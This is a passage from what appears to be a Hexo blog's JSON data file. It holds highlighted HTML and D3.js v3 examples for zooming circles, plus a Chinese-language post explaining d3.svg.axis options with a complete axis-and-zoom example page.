class=\"string\">`translate(<span class=\"subst\">$&#123;d.x&#125;</span>, <span class=\"subst\">$&#123;d.y&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">60</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> color(i))</span></span><br><span class=\"line\">            .call(drag);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> r = <span class=\"number\">60</span>;</span></span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> data = [&#123;</span></span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">zoomHandler</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            d3.select(<span class=\"string\">&#x27;.container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;event.translate&#125;</span>) scale(<span class=\"subst\">$&#123;event.scale&#125;</span>)`</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> zoom = d3.behavior.zoom()</span></span><br><span class=\"line\">            .scaleExtent([1, 10])</span><br><span class=\"line\"><span class=\"javascript\">            .on(<span class=\"string\">&#x27;zoom&#x27;</span>, zoomHandler);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h)</span></span><br><span class=\"line\">            .call(zoom);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        container.selectAll(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(data)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"function\"><span class=\"params\">d</span> =&gt;</span> <span class=\"string\">`translate(<span class=\"subst\">$&#123;d.x&#125;</span>, <span class=\"subst\">$&#123;d.y&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">60</span>);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"坐标轴","date":"2021-03-23T16:00:00.000Z","_content":"\n# 坐标轴\n\n说明：使用 `let axis = d3.svg.axis()` 生成坐标轴\n\n> 坐标轴上所有的文字、线段都以轴最外面的元素 `g` 为标准进行布局，并设置 `g` 元素的 `transform: tanslate(x, y)`（如果没有 `g` 元素，则会以根元素 `svg` 为标准）\n\n* `axis(selection)`： 将轴绘制在选择集上，一般是添加到 `g` 元素上，与 `selection.call(axis)` 的功能一样\n* `axis.orient(orientation)`： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 `bottom`、`top`、`left`、`right`，默认为 `bottom`）\n* `axis.tickValues(arr)`: 指定的数值将用于刻度中的文本\n* `axis.ticks(num)`：num 参数设置或获取（当参数为空时）坐标轴刻度的个数\n* `axis.innerTickSize(size)`：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px）\n* `axis.outerTickSize(size)`：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px）\n* `axis.tickSize(inner, outer)`：设定或获取坐标轴内外刻度线的长度\n* `axis.tickPadding(padding)`: padding 参数设置刻度线与文本间的距离 \n* `axis.tickFormat(fn)`: 格式化显示在坐标轴上的数据 \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - 坐标轴</title>\n    <style>\n        .container {\n            border: 1px solid #999;\n        }\n\n        .rect-background {\n            fill: #ddd;\n        }\n\n        .axis path {\n            display: none;\n        }\n        .axis line {\n            fill: none;\n            stroke: #fff;\n            shape-rendering: crispEdges;\n        }\n\n        .axis text {\n            font-family: sans-serif;\n            font-size: 12px;\n        }\n\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 960;\n        let h = 600;\n        let padding = 40;\n        let xData = [-450, 450];\n        let yData = [-250, 250];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('class', 'container')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.scale.linear()\n            .domain(xData)\n            .range([0, w - padding * 2]);\n\n        let yScale = d3.scale.linear()\n            .domain(yData)\n            .range([0, h - padding * 2]);\n\n        let xAxis = d3.svg.axis()\n            .scale(xScale)\n            .orient('bottom')\n            .tickSize(-h);\n\n        let yAxis = d3.svg.axis()\n            .scale(yScale)\n            .orient('left')\n            .tickSize(-w)\n            .ticks(5);\n\n        function zoomed() {\n            svg.select('.x-axis').call(xAxis);\n            svg.select('.y-axis').call(yAxis);\n        }\n\n        let zoom = d3.behavior.zoom()\n            .x(xScale)\n            .y(yScale)\n            .scaleExtent([1, 3])\n            .on('zoom', zoomed);\n\n        svg.append('g')\n            .attr('transform', `translate(${padding}, ${padding})`)\n            .append('rect')\n            .attr('class', 'rect-background')\n            .attr('width', w - padding * 2)\n            .attr('height', h - padding * 2);\n\n\n        svg.append('g')\n            .attr('class', 'axis x-axis')\n            .attr('transform', `translate(${padding}, ${h - padding})`)\n            .call(xAxis);\n            \n        svg.append('g')\n            .attr('class', 'axis y-axis')\n            .attr('transform', `translate(${padding}, ${padding})`)\n            .call(yAxis);\n\n        svg.select('.rect-background').call(zoom);\n    </script>\n</body>\n\n</html>\n```","source":"_posts/D3.js/坐标轴.md","raw":"---\ntitle: 坐标轴\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 坐标轴\n\n说明：使用 `let axis = d3.svg.axis()` 生成坐标轴\n\n> 坐标轴上所有的文字、线段都以轴最外面的元素 `g` 为标准进行布局，并设置 `g` 元素的 `transform: tanslate(x, y)`（如果没有 `g` 元素，则会以根元素 `svg` 为标准）\n\n* `axis(selection)`： 将轴绘制在选择集上，一般是添加到 `g` 元素上，与 `selection.call(axis)` 的功能一样\n* `axis.orient(orientation)`： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 `bottom`、`top`、`left`、`right`，默认为 `bottom`）\n* `axis.tickValues(arr)`: 指定的数值将用于刻度中的文本\n* `axis.ticks(num)`：num 参数设置或获取（当参数为空时）坐标轴刻度的个数\n* `axis.innerTickSize(size)`：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px）\n* `axis.outerTickSize(size)`：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px）\n* `axis.tickSize(inner, outer)`：设定或获取坐标轴内外刻度线的长度\n* `axis.tickPadding(padding)`: padding 参数设置刻度线与文本间的距离 \n* `axis.tickFormat(fn)`: 格式化显示在坐标轴上的数据 \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - 坐标轴</title>\n    <style>\n        .container {\n            border: 1px solid #999;\n        }\n\n        .rect-background {\n            fill: #ddd;\n        }\n\n        .axis path {\n            display: none;\n        }\n        .axis line {\n            fill: none;\n            stroke: #fff;\n            shape-rendering: crispEdges;\n        }\n\n        .axis text {\n            font-family: sans-serif;\n            font-size: 12px;\n        }\n\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 960;\n        let h = 600;\n        let padding = 40;\n        let xData = [-450, 450];\n        let yData = [-250, 250];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('class', 'container')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.scale.linear()\n            .domain(xData)\n            .range([0, w - padding * 2]);\n\n        let yScale = d3.scale.linear()\n            .domain(yData)\n            .range([0, h - padding * 2]);\n\n        let xAxis = d3.svg.axis()\n            .scale(xScale)\n            .orient('bottom')\n            .tickSize(-h);\n\n        let yAxis = d3.svg.axis()\n            .scale(yScale)\n            .orient('left')\n            .tickSize(-w)\n            .ticks(5);\n\n        function zoomed() {\n            svg.select('.x-axis').call(xAxis);\n            svg.select('.y-axis').call(yAxis);\n        }\n\n        let zoom = d3.behavior.zoom()\n            .x(xScale)\n            .y(yScale)\n            .scaleExtent([1, 3])\n            .on('zoom', zoomed);\n\n        svg.append('g')\n            .attr('transform', `translate(${padding}, ${padding})`)\n            .append('rect')\n            .attr('class', 'rect-background')\n            .attr('width', w - padding * 2)\n            .attr('height', h - padding * 2);\n\n\n        svg.append('g')\n            .attr('class', 'axis x-axis')\n            .attr('transform', `translate(${padding}, ${h - padding})`)\n            .call(xAxis);\n            \n        svg.append('g')\n            .attr('class', 'axis y-axis')\n            .attr('transform', `translate(${padding}, ${padding})`)\n            .call(yAxis);\n\n        svg.select('.rect-background').call(zoom);\n    </script>\n</body>\n\n</html>\n```","slug":"D3.js/坐标轴","published":1,"updated":"2021-04-28T02:31:25.108Z","_id":"cko0u126n0001y26r7fptggbm","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"坐标轴\"><a href=\"#坐标轴\" class=\"headerlink\" title=\"坐标轴\"></a>坐标轴</h1><p>说明：使用 <code>let axis = d3.svg.axis()</code> 生成坐标轴</p>\n<blockquote>\n<p>坐标轴上所有的文字、线段都以轴最外面的元素 <code>g</code> 为标准进行布局，并设置 <code>g</code> 元素的 <code>transform: tanslate(x, y)</code>（如果没有 <code>g</code> 元素，则会以根元素 <code>svg</code> 为标准）</p>\n</blockquote>\n<ul>\n<li><code>axis(selection)</code>： 将轴绘制在选择集上，一般是添加到 <code>g</code> 元素上，与 <code>selection.call(axis)</code> 的功能一样</li>\n<li><code>axis.orient(orientation)</code>： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 <code>bottom</code>、<code>top</code>、<code>left</code>、<code>right</code>，默认为 <code>bottom</code>）</li>\n<li><code>axis.tickValues(arr)</code>: 指定的数值将用于刻度中的文本</li>\n<li><code>axis.ticks(num)</code>：num 参数设置或获取（当参数为空时）坐标轴刻度的个数</li>\n<li><code>axis.innerTickSize(size)</code>：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px）</li>\n<li><code>axis.outerTickSize(size)</code>：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px）</li>\n<li><code>axis.tickSize(inner, outer)</code>：设定或获取坐标轴内外刻度线的长度</li>\n<li><code>axis.tickPadding(padding)</code>: padding 参数设置刻度线与文本间的距离 </li>\n<li><code>axis.tickFormat(fn)</code>: 格式化显示在坐标轴上的数据 </li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - 坐标轴<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .container &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#999</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .rect-background &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#ddd</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis path &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">display</span>: none;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        .axis line &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: <span class=\"number\">#fff</span>;</span></span><br><span class=\"line\"><span class=\"css\">            shape-rendering: crispEdges;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-family</span>: sans-serif;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">12px</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">960</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">40</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xData = [-<span class=\"number\">450</span>, <span class=\"number\">450</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yData = [-<span class=\"number\">250</span>, <span class=\"number\">250</span>];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\">            .domain(xData)</span><br><span class=\"line\">            .range([0, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\">            .domain(yData)</span><br><span class=\"line\">            .range([0, h - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;bottom&#x27;</span>)</span></span><br><span class=\"line\">            .tickSize(-h);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(yScale)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;left&#x27;</span>)</span></span><br><span class=\"line\">            .tickSize(-w)</span><br><span class=\"line\">            .ticks(5);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">zoomed</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.x-axis&#x27;</span>).call(xAxis);</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.y-axis&#x27;</span>).call(yAxis);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> zoom = d3.behavior.zoom()</span></span><br><span class=\"line\">            .x(xScale)</span><br><span class=\"line\">            .y(yScale)</span><br><span class=\"line\">            .scaleExtent([1, 3])</span><br><span class=\"line\"><span class=\"javascript\">            .on(<span class=\"string\">&#x27;zoom&#x27;</span>, zoomed);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;padding&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-background&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w - padding * <span class=\"number\">2</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h - padding * <span class=\"number\">2</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis x-axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;h - padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(xAxis);</span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis y-axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span 